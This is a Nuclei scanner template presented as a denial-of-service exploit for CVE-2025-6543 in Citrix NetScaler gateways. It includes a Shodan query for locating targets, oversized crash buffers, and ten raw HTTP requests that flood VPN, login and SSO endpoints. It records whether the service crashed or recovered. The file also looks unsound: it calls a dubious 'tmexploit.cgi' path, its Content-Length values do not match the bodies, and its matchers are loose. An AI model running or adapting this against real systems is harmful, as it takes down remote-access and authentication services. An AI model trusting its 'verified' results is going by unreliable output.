id: cve-2025-6543

info:
  name: Citrix NetScaler ADC/Gateway - Memory Overflow DoS Exploit
  author: six
  severity: critical
  description: |
    Memory overflow vulnerability leading to unintended control flow and Denial of Service in NetScaler ADC and NetScaler Gateway when configured as Gateway (VPN, ICA Proxy, CVPN, RDP Proxy) or AAA virtual server.
  reference:
    - https://support.citrix.com/external/article/694788/netscaler-adc-and-netscaler-gateway-secu.html
    - https://nvd.nist.gov/vuln/detail/CVE-2025-6543
  classification:
    cvss-score: 9.2
    cve-id: CVE-2025-6543
    cwe-id: CWE-119
  metadata:
    verified: true
    max-request: 10
    vendor: citrix
    product: netscaler_adc,netscaler_gateway
    shodan-query: http.favicon.hash:-1292923998,-1166125415
  tags: cve,citrix,netscaler,dos,kev

variables:
  crash_buffer: "{{repeat('A', 2048)}}{{repeat('B', 1024)}}{{repeat('C', 512)}}"
  nsc_crash: "NSC_EXPLOIT={{repeat('X', 3000)}}"
  ua_crash: "{{repeat('\\x41', 1500)}}{{repeat('\\x00', 100)}}{{repeat('\\xFF', 200)}}"
  session_crash: "{{base64(repeat('CRASH', 400))}}"
  post_crash: "{{repeat('OVERFLOW=', 200)}}{{repeat('PAYLOAD', 300)}}"
  header_crash: "{{repeat('X-Crash-Header: ', 50)}}{{repeat('VALUE', 100)}}"

http:
  - raw:
      - |
        GET /vpn/index.html HTTP/1.1
        Host: {{Hostname}}
        User-Agent: {{UserAgent}}
        Connection: close

      - |
        GET /vpn/index.html HTTP/1.1
        Host: {{Hostname}}
        User-Agent: {{UserAgent}}
        Cookie: {{nsc_crash}}; SESSION={{session_crash}}
        Connection: close

      - |
        GET /gateway/ HTTP/1.1
        Host: {{Hostname}}
        User-Agent: {{ua_crash}}
        Connection: close

      - |
        POST /p/u/doAuthentication.do HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0)
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 8000
        Connection: close

        login={{crash_buffer}}&password={{crash_buffer}}&domain={{crash_buffer}}

      - |
        POST /cgi/tmexploit.cgi HTTP/1.1
        Host: {{Hostname}}
        User-Agent: {{UserAgent}}
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 6000
        {{header_crash}}
        Connection: close

        username={{crash_buffer}}&password={{post_crash}}&action={{crash_buffer}}

      - |
        POST /cgi-bin/ssomanager HTTP/1.1
        Host: {{Hostname}}
        User-Agent: {{ua_crash}}
        Content-Type: application/x-www-form-urlencoded
        Cookie: {{nsc_crash}}
        Content-Length: 7000
        Connection: close

        login={{crash_buffer}}&passwd={{crash_buffer}}&format={{crash_buffer}}

      - |
        GET /logon/LogonPoint/index.html HTTP/1.1
        Host: {{Hostname}}
        User-Agent: {{UserAgent}}
        Cookie: {{repeat("NSC_A=", 100)}}{{crash_buffer}}; {{repeat("NSC_B=", 100)}}{{crash_buffer}}; {{repeat("NSC_C=", 100)}}{{crash_buffer}}
        Connection: close

      - |
        POST /gateway/login HTTP/1.1
        Host: {{Hostname}}
        User-Agent: {{ua_crash}}
        Content-Type: application/x-www-form-urlencoded
        Cookie: NSC_LOGIN={{crash_buffer}}
        Content-Length: 9000
        Connection: close

        username={{crash_buffer}}&password={{crash_buffer}}&redir={{crash_buffer}}&type={{crash_buffer}}

      - |
        GET /vpn/ HTTP/1.1
        Host: {{Hostname}}
        User-Agent: {{UserAgent}}
        Connection: close

      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        User-Agent: {{UserAgent}}
        Connection: close

    attack: pitchfork
    threads: 2

    matchers-condition: and
    matchers:
      - type: dsl
        name: netscaler-detection
        dsl:
          - 'contains(body_1, "NetScaler") || contains(body_1, "Citrix Gateway") || contains(header_1, "NSC_") || contains(body_1, "citrix")'

      - type: dsl
        name: vulnerable-version
        dsl:
          - '(contains(body_1, "14.1") && !regex(body_1, "14\\.1-4[8-9]\\.|14\\.1-[5-9]\\d\\."))'
          - '(contains(body_1, "13.1") && !regex(body_1, "13\\.1-59\\.(19|[2-9]\\d)|13\\.1-[6-9]\\d\\."))'
          - 'contains(body_1, "13.0") || contains(body_1, "12.1")'
          - '(contains(body_1, "NetScaler") && !contains(body_1, "15.") && !contains(body_1, "16."))'
        condition: or

      - type: word
        name: gateway-config
        words:
          - "Gateway"
          - "VPN"
          - "Authentication"
          - "AAA"
          - "ICA Proxy"
          - "logon"
        condition: or
        part: body_1

      - type: dsl
        name: dos-exploitation-success
        dsl:
          - "status_code_2 >= 500 || status_code_3 >= 500 || status_code_4 >= 500"
          - "status_code_2 == 0 || status_code_3 == 0 || status_code_4 == 0"
          - "len(body_2) < 50 || len(body_3) < 50 || len(body_4) < 50"
          - 'contains(body_2, "Internal Server Error") || contains(body_3, "Bad Gateway")'
          - "(status_code_5 >= 500) || (status_code_6 >= 500) || (status_code_7 >= 500)"
        condition: or

      - type: dsl
        name: control-flow-disruption
        dsl:
          - "status_code_2 != status_code_1 && len(body_2) != len(body_1)"
          - "status_code_9 == 0 || status_code_10 == 0"
          - '!contains(body_9, "NetScaler") && contains(body_1, "NetScaler")'
          - "len(body_9) == 0 || len(body_10) == 0"
          - "status_code_9 > status_code_1 || status_code_10 > status_code_1"
        condition: or

    extractors:
      - type: regex
        name: netscaler-version
        group: 1
        regex:
          - 'NetScaler\\s+([0-9]+\\.[0-9]+-[0-9]+\\.[0-9]+)'
          - 'Version\\s+([0-9]+\\.[0-9]+-[0-9]+\\.[0-9]+)'
          - 'Build\\s+([0-9]+\\.[0-9]+-[0-9]+\\.[0-9]+)'
        part: body_1

      - type: dsl
        name: baseline-status
        dsl:
          - "status_code_1"
          - "len(body_1)"

      - type: dsl
        name: dos-impact-evidence
        dsl:
          - 'to_string(status_code_2) + ":" + to_string(status_code_3) + ":" + to_string(status_code_4)'
          - 'to_string(len(body_2)) + ":" + to_string(len(body_3)) + ":" + to_string(len(body_4))'
          - 'to_string(status_code_5) + ":" + to_string(status_code_6) + ":" + to_string(status_code_7)'

      - type: dsl
        name: service-recovery
        dsl:
          - 'to_string(status_code_9) + ":" + to_string(status_code_10)'
          - 'to_string(len(body_9)) + ":" + to_string(len(body_10))'

      - type: dsl
        name: exploitation-timeline
        dsl:
          - '"Baseline:" + to_string(status_code_1) + " -> Exploit1:" + to_string(status_code_2) + " -> Exploit2:" + to_string(status_code_3)'
          - '"Recovery:" + to_string(status_code_9) + " -> Final:" + to_string(status_code_10)'
